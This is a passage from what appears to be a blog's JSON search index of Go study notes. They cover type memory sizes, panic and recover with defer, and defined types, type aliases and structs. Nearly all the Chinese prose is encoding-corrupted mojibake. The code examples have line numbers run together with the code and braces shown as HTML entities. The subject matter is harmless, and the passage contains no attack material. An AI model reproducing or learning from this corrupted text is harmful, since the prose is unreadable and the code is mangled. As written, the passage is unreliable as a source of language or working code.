string ç±»å‹ã€ä¸¤ä¸ª int ç±»å‹ç»„æˆï¼Œæ‰€ä»¥å®ƒå ç”¨çš„å†…å­˜å¤§å°æ˜¯ 16 + 8 + 8 = 32 ä¸ªå­—èŠ‚ã€‚ æ³¨æ„ï¼Œè¿™é‡Œçš„string å°±æ˜¯ä¸Šé¢çš„ string ï¼Œæ‰€ä»¥æ˜¯ 16 ä¸ªå­—èŠ‚ã€‚ å› ä¸ºç©ºç»“æ„ä½“ä¸­æ²¡æœ‰å­—æ®µï¼Œæ‰€ä»¥æ€»å¤§å°æ˜¯é›¶ã€‚ æ€»ç»“å¯¹äºæ•´å‹ã€æ•°ç»„ã€ç»“æ„ä½“è¿™ç±»ç±»å‹ï¼Œå®ƒä»¬çš„å†…å­˜è¡¨ç¤ºå°±æ˜¯å®ƒä»¬è‡ªèº«çš„æ•°æ®å†…å®¹ï¼Œæ‰€ä»¥è®¡ç®—å ç”¨å†…å­˜å¤§å°æ—¶ï¼Œå°±æ˜¯ç»„æˆå®ƒä»¬æ•°æ®æœ¬èº«çš„å¤§å°ã€‚ è€Œå¯¹äºåˆ‡ç‰‡ã€stringã€map ç­‰ç±»å‹æ¥è¯´ï¼Œå®ƒä»¬çš„å†…å­˜è¡¨ç¤ºåˆ™æ˜¯å®ƒä»¬æ•°æ®å†…å®¹çš„â€œæè¿°ç¬¦â€ï¼Œæ‰€ä»¥è®¡ç®—å ç”¨å†…å­˜å¤§å°æ—¶ï¼Œéœ€è¦ä»¥æè¿°ç¬¦çš„å¤§å°ä¸ºå‡†ã€‚ å‰è€…ä½œä¸ºå‡½æ•°å‚æ•°ä¼ é€’æ—¶ï¼Œå¸¸è¢«æåˆ°æœ‰æ€§èƒ½å¼€é”€ï¼Œè€Œåè€…åˆ™æ²¡æœ‰ï¼Œä¹Ÿæ­£æ˜¯è¿™ä¸ªåŸå› ã€‚","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”panic","slug":"go-language-study-notes-panic","date":"2022-10-28T15:16:51.000Z","updated":"2023-02-18T03:28:33.591Z","comments":true,"path":"go-language-study-notes-panic/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-panic/","excerpt":"Go å‡½æ•°çš„å¥å£®æ€§è®¾è®¡åŒ…æ‹¬å¾ˆå¤šæ–¹é¢ï¼Œé¦–å…ˆæ˜¯æœ€åŸºæœ¬çš„â€œä¸‰ä¸è¦â€åŸåˆ™ï¼Œç®€å•æ¥äº†è§£ä¸€ä¸‹ã€‚","text":"Go å‡½æ•°çš„å¥å£®æ€§è®¾è®¡åŒ…æ‹¬å¾ˆå¤šæ–¹é¢ï¼Œé¦–å…ˆæ˜¯æœ€åŸºæœ¬çš„â€œä¸‰ä¸è¦â€åŸåˆ™ï¼Œç®€å•æ¥äº†è§£ä¸€ä¸‹ã€‚ ä¸‰ä¸è¦åŸåˆ™ä¸è¦ç›¸ä¿¡ä»»ä½•å¤–éƒ¨è¾“å…¥çš„å‚æ•°å‡½æ•°çš„ä½¿ç”¨è€…å¯èƒ½æ˜¯ä»»ä½•äººï¼Œè¿™äº›äººåœ¨ä½¿ç”¨å‡½æ•°ä¹‹å‰å¯èƒ½éƒ½æ²¡æœ‰é˜…è¯»è¿‡ä»»ä½•æ‰‹å†Œæˆ–æ–‡æ¡£ï¼Œä»–ä»¬ä¼šå‘å‡½æ•°ä¼ å…¥ä½ æ„æƒ³ä¸åˆ°çš„å‚æ•°ã€‚å› æ­¤ï¼Œä¸ºäº†ä¿è¯å‡½æ•°çš„å¥å£®æ€§ï¼Œå‡½æ•°éœ€è¦å¯¹æ‰€æœ‰è¾“å…¥çš„å‚æ•°è¿›è¡Œåˆæ³•æ€§çš„æ£€æŸ¥ã€‚ ä¸€æ—¦å‘ç°é—®é¢˜ï¼Œç«‹å³ç»ˆæ­¢å‡½æ•°çš„æ‰§è¡Œï¼Œè¿”å›é¢„è®¾çš„é”™è¯¯å€¼ã€‚ ä¸è¦å¿½ç•¥ä»»ä½•ä¸€ä¸ªé”™è¯¯åœ¨å‡½æ•°å®ç°ä¸­ï¼Œé€šå¸¸ä¼šè°ƒç”¨æ ‡å‡†åº“æˆ–ç¬¬ä¸‰æ–¹åŒ…æä¾›çš„å‡½æ•°æˆ–æ–¹æ³•ã€‚å¯¹äºè¿™äº›è°ƒç”¨ï¼Œä¸èƒ½å‡å®šå®ƒä¸€å®šä¼šæˆåŠŸï¼Œä¸€å®šè¦æ˜¾å¼åœ°æ£€æŸ¥è¿™äº›è°ƒç”¨è¿”å›çš„é”™è¯¯å€¼ã€‚ ä¸€æ—¦å‘ç°é”™è¯¯ï¼Œè¦åŠæ—¶ç»ˆæ­¢å‡½æ•°æ‰§è¡Œï¼Œé˜²æ­¢é”™è¯¯ç»§ç»­ä¼ æ’­ã€‚ ä¸è¦å‡å®šå¼‚å¸¸ä¸ä¼šå‘ç”Ÿå…ˆè¦ç¡®å®šä¸€ä¸ªè®¤çŸ¥ï¼šå¼‚å¸¸ä¸æ˜¯é”™è¯¯ã€‚ é”™è¯¯æ˜¯å¯é¢„æœŸçš„ï¼Œä¹Ÿæ˜¯ç»å¸¸ä¼šå‘ç”Ÿçš„ï¼Œæœ‰å¯¹åº”çš„å…¬å¼€é”™è¯¯ç å’Œé”™è¯¯å¤„ç†é¢„æ¡ˆï¼Œä½†å¼‚å¸¸å´æ˜¯å°‘è§çš„ã€æ„æ–™ä¹‹å¤–çš„ã€‚é€šå¸¸æ„ä¹‰ä¸Šçš„å¼‚å¸¸ï¼ŒæŒ‡çš„æ˜¯ç¡¬ä»¶å¼‚å¸¸ã€æ“ä½œç³»ç»Ÿå¼‚å¸¸ã€è¯­è¨€è¿è¡Œæ—¶å¼‚å¸¸ï¼Œè¿˜æœ‰æ›´å¤§å¯èƒ½æ˜¯ä»£ç ä¸­æ½œåœ¨ bug å¯¼è‡´çš„å¼‚å¸¸ï¼Œæ¯”å¦‚ä»£ç ä¸­å‡ºç°äº†ä»¥ 0 ä½œä¸ºåˆ†æ¯ï¼Œæˆ–è€…æ˜¯æ•°ç»„è¶Šç•Œè®¿é—®ç­‰æƒ…å†µã€‚ è™½ç„¶å¼‚å¸¸å‘ç”Ÿæ˜¯â€œå°ä¼—äº‹ä»¶â€ï¼Œä½†æ˜¯ä¸èƒ½å‡å®šå¼‚å¸¸å°±ä¸ä¼šå‘ç”Ÿã€‚ panicä¸åŒç¼–ç¨‹è¯­è¨€è¡¨ç¤ºå¼‚å¸¸ï¼ˆExceptionï¼‰è¿™ä¸ªæ¦‚å¿µçš„è¯­æ³•éƒ½ä¸ç›¸åŒï¼Œåœ¨ Go è¯­è¨€ä¸­ï¼Œå¼‚å¸¸è¿™ä¸ªæ¦‚å¿µç”± panic è¡¨ç¤ºã€‚ panic æŒ‡çš„æ˜¯ Go ç¨‹åºåœ¨è¿è¡Œæ—¶å‡ºç°çš„ä¸€ä¸ªå¼‚å¸¸æƒ…å†µã€‚å¦‚æœå¼‚å¸¸å‡ºç°äº†ï¼Œä½†æ²¡æœ‰è¢«æ•è·å¹¶æ¢å¤ï¼ŒGo ç¨‹åºçš„æ‰§è¡Œå°±ä¼šè¢«ç»ˆæ­¢ï¼Œå³ä¾¿å‡ºç°å¼‚å¸¸çš„ä½ç½®ä¸åœ¨ä¸» Goroutine ä¸­ä¹Ÿä¼šè¿™æ ·ã€‚ åœ¨ Go ä¸­ï¼Œpanic ä¸»è¦æœ‰ä¸¤ç±»æ¥æºï¼Œä¸€ç±»æ˜¯æ¥è‡ª Go è¿è¡Œæ—¶ï¼Œå¦ä¸€ç±»åˆ™æ˜¯ Go å¼€å‘äººå‘˜é€šè¿‡ panic å‡½æ•°ä¸»åŠ¨è§¦å‘çš„ã€‚æ— è®ºæ˜¯å“ªç§ï¼Œä¸€æ—¦ panic è¢«è§¦å‘ï¼Œåç»­ Go ç¨‹åºçš„æ‰§è¡Œè¿‡ç¨‹éƒ½æ˜¯ä¸€æ ·çš„ï¼Œè¿™ä¸ªè¿‡ç¨‹è¢« Go è¯­è¨€ç§°ä¸º panickingã€‚ ä¸‹é¢ç”¨ä¸€ä¸ªä¾‹å­æ¥ç›´è§‚æ„Ÿå—ä¸€ä¸‹ panicking è¿™ä¸ªè¿‡ç¨‹ï¼š 1234567891011121314151617181920212223func foo() &#123; println(\"call foo\") bar() println(\"exit foo\")&#125;func bar() &#123; println(\"call bar\") panic(\"panic occurs in bar\") zoo() println(\"exit bar\")&#125;func zoo() &#123; println(\"call zoo\") println(\"exit zoo\")&#125;func main() &#123; println(\"call main\") foo() println(\"exit main\")&#125; åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œä» main å‡½æ•°å¼€å§‹ï¼Œå‡½æ•°çš„è°ƒç”¨æ¬¡åºä¾æ¬¡ä¸º main -&gt; foo -&gt; bar -&gt; zooã€‚åœ¨ bar å‡½æ•°ä¸­ï¼Œè°ƒç”¨ panic å‡½æ•°æ‰‹åŠ¨è§¦å‘äº† panicã€‚ æœ€ç»ˆç¨‹åºçš„è¾“å‡ºç»“æœæ˜¯ï¼š 1234call maincall foocall barpanic: panic occurs in bar ä¸‹é¢ç”¨ä¸€å¼ å›¾æ¥è§£é‡Šç¨‹åºçš„è°ƒç”¨è¿‡ç¨‹ï¼š å…³é”®éƒ¨åˆ†æœ‰ä¸¤å¤„ï¼š åœ¨ bar å‡½æ•°ä¸­ï¼Œä»£ç åœ¨æ‰§è¡Œä¸‹ä¸€ä¸ªå‡½æ•°ä¹‹å‰è°ƒç”¨äº† panic å‡½æ•°è§¦å‘äº†å¼‚å¸¸ï¼Œæ‰€ä»¥ bar å‡½æ•°çš„æ‰§è¡Œå°±æ­¤åœä½äº†ï¼Œpanicking è¿‡ç¨‹å°±æ­¤å¼€å§‹ å› ä¸ºæ²¡æœ‰æ•è· panicï¼Œæ‰€ä»¥ panic ä¼šæ²¿ç€å‡½æ•°è°ƒç”¨æ ˆä¸€ç›´å‘ä¸‹èµ°ï¼Œä» foo/main è¿™äº›å‡½æ•°çš„è§†è§’æ¥çœ‹ï¼Œå¯¹ bar/foo å‡½æ•°çš„è°ƒç”¨ï¼Œå’Œå¯¹ panic å‡½æ•°çš„è°ƒç”¨æ˜¯ä¸€æ ·çš„ï¼Œå› ä¸ºéƒ½æ²¡æœ‰æ•æ‰ panicï¼Œæ‰€ä»¥è°ƒç”¨å®Œ panic ä¹‹åï¼Œè‡ªèº«çš„æ‰§è¡Œå°±æ­¤åœæ­¢äº†ï¼Œå·²ç»æ‰§è¡Œå®Œæˆçš„å‡½æ•°ä¼šä¾æ¬¡ä»æ ˆé¡¶å¼¹å‡ºï¼Œæœ€åmain å‡½æ•°ä¹Ÿ exit äº† ä¸è¿‡ï¼ŒGo ä¹Ÿæä¾›äº†æ•æ‰ panic å¹¶æ¢å¤ç¨‹åºæ­£å¸¸æ‰§è¡Œç§©åºçš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ recover å‡½æ•°æ¥å®ç°è¿™ä¸€ç‚¹ã€‚ ç”¨ä¸Šé¢è¿™ä¸ªä¾‹å­åˆ†æï¼Œåœ¨è§¦å‘ panic çš„ bar å‡½æ•°ä¸­ï¼Œå¯¹ panic è¿›è¡Œæ•æ‰å¹¶æ¢å¤ï¼Œç›´æ¥æ¥çœ‹æ¢å¤åï¼Œæ•´ä¸ªç¨‹åºçš„æ‰§è¡Œæƒ…å†µæ˜¯ä»€ä¹ˆæ ·çš„ï¼ˆé™¤äº† bar å‡½æ•°è°ƒæ•´äº†ï¼Œå…¶ä»–å‡½æ•°å‡æ²¡æœ‰æ”¹å˜ï¼‰ï¼š 1234567891011func bar() &#123; defer func() &#123; if e := recover(); e != nil &#123; fmt.Println(\"recover the panic:\", e) &#125; &#125;() println(\"call bar\") panic(\"panic occurs in bar\") zoo() println(\"exit bar\")&#125; åœ¨æ›´æ–°ç‰ˆçš„ bar å‡½æ•°ä¸­ï¼Œé€šè¿‡ defer åŒ¿åå‡½æ•°ä¸­è°ƒç”¨ recover å‡½æ•°å¯¹ panic è¿›è¡Œäº†æ•è·ï¼š å¦‚æœæ•è·åˆ°ï¼Œpanic å¼•å‘çš„ panicking è¿‡ç¨‹å°±ä¼šåœæ­¢ï¼Œå¹¶è¿”å›ä»¥ panic çš„å…·ä½“å†…å®¹ä¸ºé”™è¯¯ä¸Šä¸‹æ–‡ä¿¡æ¯çš„é”™è¯¯å€¼ å¦‚æœæ²¡æœ‰ panic å‘ç”Ÿï¼Œé‚£ä¹ˆ recover å°†è¿”å› nil æ‰§è¡Œæ›´æ–°åçš„ç¨‹åºï¼Œå¾—åˆ°å¦‚ä¸‹ç»“æœï¼š 123456call maincall foocall barrecover the panic: panic occurs in barexit fooexit main è°ƒç”¨è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å¯ä»¥çœ‹åˆ°ï¼Œæ­¤æ—¶ main å‡½æ•°æ˜¯æ­£å¸¸æ‰§è¡Œå®Œé€€å‡ºçš„ï¼Œå› ä¸ºä½¿ç”¨äº† recover é¡ºåˆ©æ•è·åˆ°äº† panicã€‚ é¢å¯¹æœ‰å¦‚æ­¤è¡Œä¸ºç‰¹ç‚¹çš„ panicï¼Œé‚£ä¹ˆåˆ°åº•è¯¥å¦‚ä½•ä½¿ç”¨å‘¢ï¼Ÿæ˜¯ä¸æ˜¯åœ¨æ‰€æœ‰ Go å‡½æ•°æˆ–æ–¹æ³•ä¸­ï¼Œéƒ½è¦ç”¨ defer å‡½æ•°æ¥æ•æ‰å’Œæ¢å¤ panic å‘¢ï¼Ÿ å¦‚ä½•åº”å¯¹ panicå…¶å®ä¸ç”¨ï¼ŒåŸå› æœ‰ä¸¤ç‚¹ï¼š å¤§é‡çš„ panic ä¼šå¾’å¢å¼€å‘äººå‘˜å®ç°å‡½æ•°æ—¶çš„å¿ƒæ™ºè´Ÿæ‹… å¾ˆå¤šå‡½æ•°éå¸¸ç®€å•ï¼Œæ ¹æœ¬ä¸ä¼šå‡ºç° panic æƒ…å†µï¼Œå¢åŠ  panic æ•è·å’Œæ¢å¤ï¼Œåå€’ä¼šå¢åŠ å‡½æ•°çš„å¤æ‚æ€§ã€‚åŒæ—¶ï¼Œdefer å‡½æ•°ä¼šå¸¦æ¥ä¸€å®šæ€§èƒ½å¼€é”€ ä¸‹é¢æä¾›ä¸‰ç‚¹ç»éªŒï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹ã€‚ è¯„ä¼° panic ç­‰çº§é¦–å…ˆï¼Œåº”è¯¥çŸ¥é“ä¸€ä¸ªäº‹å®ï¼šä¸åŒåº”ç”¨å¯¹å¼‚å¸¸å¼•èµ·çš„ç¨‹åºå´©æºƒé€€å‡ºçš„å¿å—åº¦æ˜¯ä¸ä¸€æ ·çš„ã€‚ æ¯”å¦‚ï¼Œä¸€ä¸ªå•æ¬¡è¿è¡Œäºæ§åˆ¶å°çª—å£ä¸­çš„å‘½ä»¤è¡Œäº¤äº’ç±»ç¨‹åºï¼ˆCLIï¼‰ï¼Œå’Œä¸€ä¸ªå¸¸é©»å†…å­˜çš„åç«¯ HTTP æœåŠ¡å™¨ç¨‹åºï¼Œå‰è€…å³ä¾¿å› å¼‚å¸¸å´©æºƒï¼Œå¯¹ç”¨æˆ·æ¥è¯´ä¹Ÿä»…ä»…æ˜¯å†é‡æ–°è¿è¡Œä¸€æ¬¡è€Œå·²ã€‚ä½†åè€…ä¸€æ—¦å´©æºƒï¼Œå°±å¾ˆå¯èƒ½å¯¼è‡´æ•´ä¸ªç½‘ç«™åœæ­¢æœåŠ¡ã€‚ æ‰€ä»¥é’ˆå¯¹å„ç§åº”ç”¨å¯¹ panic å¿å—åº¦çš„å·®å¼‚ï¼Œåº”è¯¥é‡‡å–çš„ panic çš„ç­–ç•¥ä¹Ÿæ˜¯ä¸åŒçš„ã€‚ åƒåç«¯ HTTP æœåŠ¡å™¨ç¨‹åºè¿™æ ·çš„ä»»åŠ¡å…³é”®ç³»ç»Ÿï¼Œå°±éœ€è¦åœ¨ç‰¹å®šçš„ä½ç½®æ•è·å¹¶æ¢å¤ panicï¼Œä»¥ä¿è¯æœåŠ¡å™¨æ•´ä½“çš„å¥å£®åº¦ã€‚ æç¤ºæ½œåœ¨ bugå½“ä¸€äº›æœ¬ä¸è¯¥å‘ç”Ÿçš„äº‹æƒ…å¯¼è‡´ç¨‹åºå¼‚å¸¸ç»“æŸæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ panic å……å½“ç±»ä¼¼æ–­è¨€çš„ä½œç”¨ã€‚ åœ¨ json åŒ…çš„ encode.go ä¸­ä¹Ÿæœ‰ä½¿ç”¨ panic å……å½“æ–­è¨€çš„ä¾‹å­ï¼š 12345678910111213// $GOROOT/src/encoding/json/encode.gofunc (w *reflectWithString) resolve() error &#123; ... ... switch w.k.Kind() &#123; case reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32, reflect.Int64: w.ks = strconv.FormatInt(w.k.Int(), 10) return nil case reflect.Uint, reflect.Uint8, reflect.Uint16, reflect.Uint32, reflect.Uint64, reflect.Uintptr: w.ks = strconv.FormatUint(w.k.Uint(), 10) return nil &#125; panic(\"unexpected map key type\")&#125; è¿™æ®µä»£ç ä¸­ï¼Œresolve æ–¹æ³•çš„æœ€åä¸€è¡Œä»£ç å°±ç›¸å½“äºä¸€ä¸ªâ€œä»£ç é€»è¾‘ä¸ä¼šèµ°åˆ°è¿™é‡Œâ€çš„æ–­è¨€ã€‚ä¸€æ—¦è§¦å‘â€œæ–­è¨€â€ï¼Œè¿™å¾ˆå¯èƒ½å°±æ˜¯ä¸€ä¸ªæ½œåœ¨ bugã€‚ å»æ‰ panic è¿™è¡Œä»£ç å¹¶ä¸ä¼šå¯¹ç¨‹åºé€ æˆå½±å“ï¼Œä½†æ˜¯å¦‚æœå­˜åœ¨çš„è¯ï¼Œå½“é—®é¢˜å‡ºç°æ—¶ï¼Œå°±å¯ä»¥å€ŸåŠ© panic ä½œä¸ºæ–­è¨€å¿«é€Ÿå®šä½åˆ°é—®é¢˜æ‰€åœ¨ã€‚ ä¸è¦æ··æ·†å¼‚å¸¸ä¸é”™è¯¯åœ¨ Go ä¸­ï¼Œé€šå¸¸ä¼šå¯¼å…¥å¤§é‡ç¬¬ä¸‰æ–¹åŒ…ï¼Œè€Œå¯¹äºè¿™äº›ç¬¬ä¸‰æ–¹åŒ… API ä¸­æ˜¯å¦ä¼šå¼•å‘panicï¼Œè°ƒç”¨è€…æ˜¯ä¸çŸ¥é“çš„ã€‚ å› æ­¤ä¸Šå±‚ä»£ç ï¼Œä¹Ÿå°±æ˜¯ API è°ƒç”¨è€…æ ¹æœ¬ä¸ä¼šå»é€ä¸€äº†è§£ API æ˜¯å¦ä¼šå¼•å‘panicï¼Œä¹Ÿæ²¡æœ‰ä¹‰åŠ¡å»å¤„ç†å¼•å‘çš„ panicã€‚å› æ­¤ï¼Œåœ¨ Go ä¸­ï¼ŒAPI çš„æä¾›è€…ï¼Œä¸€å®šä¸è¦å°† panic å½“ä½œé”™è¯¯è¿”å›ç»™ API è°ƒç”¨è€…ã€‚ æ€»ç»“ é”™è¯¯æ˜¯ errorï¼Œå¼‚å¸¸æ˜¯ panicï¼Œä¸¤è€…æ˜¯æœ‰æœ¬è´¨åŒºåˆ«çš„ defer è¦åœ¨panic ä¹‹å‰ï¼Œæ‰èƒ½æ‰§è¡Œ recover åªèƒ½åœ¨defer ä¸­è°ƒç”¨æ‰èƒ½ç”Ÿæ•ˆ defer å†…éƒ¨çš„recover åªèƒ½æ•è·å½“å‰åç¨‹çš„Panicï¼Œä¸èƒ½è·¨åç¨‹æ‰§è¡Œ æ— è®ºåœ¨å“ªä¸ª Goroutine ä¸­å‘ç”Ÿæœªè¢«æ¢å¤çš„ panicï¼Œæ•´ä¸ªç¨‹åºéƒ½å°†å´©æºƒé€€å‡º å‚è€ƒé“¾æ¥ Tony Bai Â· Go è¯­è¨€ç¬¬ä¸€è¯¾","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”ç»“æ„ä½“","slug":"go-language-study-notes-struct","date":"2022-10-27T15:59:51.000Z","updated":"2023-02-18T03:28:33.595Z","comments":true,"path":"go-language-study-notes-struct/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-struct/","excerpt":"Go è¯­è¨€å¹¶ä¸æ˜¯ä¸€é—¨é¢å‘å¯¹è±¡çš„ç¼–ç¨‹è¯­è¨€ï¼Œå®ƒæ²¡æœ‰é¢å‘å¯¹è±¡æ‰€ç‰¹æœ‰çš„ classï¼Œåœ¨ Go è¯­è¨€ä¸­ï¼Œå¯¹äº‹ç‰©è¿›è¡ŒæŠ½è±¡ä½¿ç”¨ç»“æ„ä½“ç±»å‹ structã€‚","text":"Go è¯­è¨€å¹¶ä¸æ˜¯ä¸€é—¨é¢å‘å¯¹è±¡çš„ç¼–ç¨‹è¯­è¨€ï¼Œå®ƒæ²¡æœ‰é¢å‘å¯¹è±¡æ‰€ç‰¹æœ‰çš„ classï¼Œåœ¨ Go è¯­è¨€ä¸­ï¼Œå¯¹äº‹ç‰©è¿›è¡ŒæŠ½è±¡ä½¿ç”¨ç»“æ„ä½“ç±»å‹ structã€‚ ä¸è¿‡ï¼Œåœ¨å­¦ä¹ å¦‚ä½•å®šä¹‰ä¸€ä¸ªç»“æ„ä½“ç±»å‹ä¹‹å‰ï¼Œé¦–å…ˆè¦æ¥çœ‹çœ‹å¦‚ä½•åœ¨ Go ä¸­è‡ªå®šä¹‰ä¸€ä¸ªæ–°ç±»å‹ã€‚ è‡ªå®šä¹‰æ–°ç±»å‹åœ¨ Go ä¸­ï¼Œè‡ªå®šä¹‰ä¸€ä¸ªæ–°ç±»å‹ä¸€èˆ¬æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸‹é¢ä¸€ä¸€ä»‹ç»ã€‚ typeä½¿ç”¨ç±»å‹å£°æ˜è¯­æ³•ï¼ˆType å…³é”®å­—ï¼‰ï¼Œè¿™ä¹Ÿæ˜¯æœ€å¸¸ç”¨çš„æ–¹å¼ï¼š 1type T S // åŸºäºç±»å‹ S å®šä¹‰ä¸€ä¸ªæ–°ç±»å‹T Go è¯­è¨€ä¸­ï¼Œå‡¡é€šè¿‡ç±»å‹å£°æ˜è¯­æ³•å£°æ˜çš„ç±»å‹éƒ½è¢«ç§°ä¸º defined ç±»å‹ã€‚ åœ¨è¿™é‡Œï¼ŒS å¯ä»¥æ˜¯ä»»ä½•ä¸€ä¸ªå·²å®šä¹‰çš„ç±»å‹ï¼ŒåŒ…æ‹¬ Go åŸç”Ÿç±»å‹ï¼Œæˆ–è€…æ˜¯å…¶ä»–å·²å®šä¹‰çš„è‡ªå®šä¹‰ç±»å‹ã€‚ 12type T1 inttype T2 T1 åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä»£ç ä¸­ï¼Œæ–°ç±»å‹ T1 æ˜¯åŸºäº Go åŸç”Ÿç±»å‹ int å®šä¹‰çš„æ–°è‡ªå®šä¹‰ç±»å‹ï¼Œè€Œæ–°ç±»å‹ T2 åˆ™æ˜¯åŸºäºåˆšåˆšå®šä¹‰çš„ç±»å‹ T1ï¼Œå®šä¹‰çš„æ–°ç±»å‹ã€‚ è¿™é‡Œå¼•å…¥ä¸€ä¸ªæ¦‚å¿µï¼šåº•å±‚ç±»å‹ï¼ˆUnderlying Typeï¼‰â€”â€” å¦‚æœä¸€ä¸ªæ–°ç±»å‹æ˜¯åŸºäºæŸä¸ª Go åŸç”Ÿç±»å‹æˆ–è€…å…¶ä»–å·²å®šä¹‰çš„è‡ªå®šä¹‰ç±»å‹å®šä¹‰çš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¯´ Go åŸç”Ÿç±»å‹/å…¶ä»–å·²å®šä¹‰çš„è‡ªå®šä¹‰ç±»å‹æ˜¯æ–°ç±»å‹çš„åº•å±‚ç±»å‹ã€‚ åº•å±‚ç±»å‹åœ¨ Go è¯­è¨€ä¸­æœ‰é‡è¦ä½œç”¨ï¼Œå®ƒè¢«ç”¨æ¥åˆ¤æ–­ä¸¤ä¸ªç±»å‹æœ¬è´¨ä¸Šæ˜¯å¦ç›¸åŒï¼ˆIdenticalï¼‰ã€‚ åœ¨ä¸Šé¢ä¾‹å­ä¸­ï¼Œè™½ç„¶ T1 å’Œ T2 æ˜¯ä¸åŒç±»å‹ï¼Œä½†å› ä¸ºå®ƒä»¬çš„åº•å±‚ç±»å‹éƒ½æ˜¯ç±»å‹ intï¼Œæ‰€ä»¥å®ƒä»¬åœ¨æœ¬è´¨ä¸Šæ˜¯ç›¸åŒçš„ã€‚ è€Œæœ¬è´¨ä¸Šç›¸åŒçš„ä¸¤ä¸ªç±»å‹ï¼Œå®ƒä»¬çš„å˜é‡å¯ä»¥é€šè¿‡æ˜¾å¼è½¬å‹è¿›è¡Œç›¸äº’èµ‹å€¼ï¼Œç›¸åï¼Œå¦‚æœæœ¬è´¨ä¸Šæ˜¯ä¸åŒçš„ä¸¤ä¸ªç±»å‹ï¼Œå®ƒä»¬çš„å˜é‡é—´è¿æ˜¾å¼è½¬å‹éƒ½ä¸å¯èƒ½ï¼Œæ›´ä¸è¦è¯´ç›¸äº’èµ‹å€¼äº†ã€‚ 1234567891011type T1 inttype T2 T1type T3 stringfunc main() &#123; var n1 T1 var n2 T2 = 5 n1 = T1(n2) // ok var s T3 = \"hello\" n1 = T1(s) // é”™è¯¯ï¼šcannot convert s (type T3) to type T1&#125; é™¤äº†åŸºäºå·²æœ‰ç±»å‹å®šä¹‰æ–°ç±»å‹ä¹‹å¤–ï¼Œè¿˜å¯ä»¥åŸºäºç±»å‹å­—é¢å€¼æ¥å®šä¹‰æ–°ç±»å‹ï¼Œè¿™ç§æ–¹å¼å¤šç”¨äºè‡ªå®šä¹‰ä¸€ä¸ªæ–°çš„å¤åˆç±»å‹ï¼š 12345678type M map[int]string // å®šä¹‰ä¸€ä¸ª [int]string ç±»å‹çš„ maptype S []string // å®šä¹‰ä¸€ä¸ª åˆ‡ç‰‡ç±»å‹çš„æ–°ç±»å‹// ä¹Ÿå¯ä»¥å†™æˆè¿™æ ·type ( M map[int]string S []int) type aliasç¬¬äºŒç§æ–¹å¼æ˜¯ä½¿ç”¨ç±»å‹åˆ«åï¼ˆType Aliasï¼‰ï¼š 1type T = S // type alias ä¸å‰é¢çš„ç¬¬ä¸€ç§è‡ªå®šä¹‰æ–°ç±»å‹çš„æ–¹å¼ç›¸æ¯”ï¼Œç±»å‹åˆ«ååœ¨å½¢å¼ä¸Šå¤šå‡ºäº†ä¸€ä¸ªç­‰å·ï¼Œå…¶æ¬¡å°±æ˜¯æ–°ç±»å‹ T å’ŒåŸç±»å‹ S æ˜¯å®Œå…¨ç­‰ä»·çš„ï¼Œå®Œå…¨ç­‰ä»·çš„æ„æ€å°±æ˜¯ï¼Œç±»å‹åˆ«åå¹¶æ²¡æœ‰å®šä¹‰å‡ºæ–°ç±»å‹ï¼Œç±» T ä¸ S å®é™…ä¸Šå°±æ˜¯åŒä¸€ç§ç±»å‹ã€‚ é€šè¿‡ä¸‹é¢è¿™æ®µç¤ºä¾‹ä»£ç æ¥éªŒè¯ï¼š 12345type T = string var s string = \"hello\" var t T = s // okfmt.Printf(\"%T\\n\", t) // string ç±»å‹ T æ˜¯é€šè¿‡ç±»å‹åˆ«åçš„æ–¹å¼å®šä¹‰çš„ï¼ŒT ä¸ string å®é™…ä¸Šæ˜¯ä¸€ä¸ªç±»å‹ï¼Œæ‰€ä»¥è¿™é‡Œï¼Œä½¿ç”¨ string ç±»å‹å˜é‡ s ç»™ T ç±»å‹å˜é‡ t èµ‹å€¼çš„åŠ¨ä½œï¼Œå®è´¨ä¸Šå°±æ˜¯åŒç±»å‹èµ‹å€¼ã€‚æœ€åè¾“å‡ºçš„ string ä¹Ÿæ˜¯ç¬¦åˆé¢„æœŸçš„ã€‚ ç»“æ„ä½“å¤åˆç±»å‹çš„å®šä¹‰ä¸€èˆ¬éƒ½æ˜¯é€šè¿‡ç±»å‹å­—é¢å€¼çš„æ–¹å¼æ¥è¿›è¡Œçš„ï¼Œä½œä¸ºå¤åˆç±»å‹ä¹‹ä¸€çš„ç»“æ„ä½“ç±»å‹ä¹Ÿä¸ä¾‹å¤–ï¼š 1234567// å®šä¹‰ä¸€ä¸ªåç§°ä¸º T çš„ç»“æ„ä½“ç±»å‹type T struct &#123; Field1 T1 Field2 T2 // ... ... FieldN Tn&#125; ç±»å‹å­—é¢å€¼ç”±è‹¥å¹²ä¸ªå­—æ®µï¼ˆfieldï¼‰èšåˆè€Œæˆï¼Œæ¯ä¸ªå­—æ®µæœ‰è‡ªå·±çš„åç§°ä¸ç±»å‹ï¼Œä¸”æ¯ä¸ªå­—æ®µçš„åç§°æ˜¯å”¯ä¸€çš„ã€‚ å¦å¤–ï¼Œè¿™ä¸ªåç§°ä¸º T çš„ç»“æ„ä½“ï¼Œå› ä¸ºé¦–å­—æ¯æ˜¯å¤§å†™çš„å…³ç³»ï¼Œå®ƒæ˜¯å¸¦æœ‰å¯¼å‡ºæ 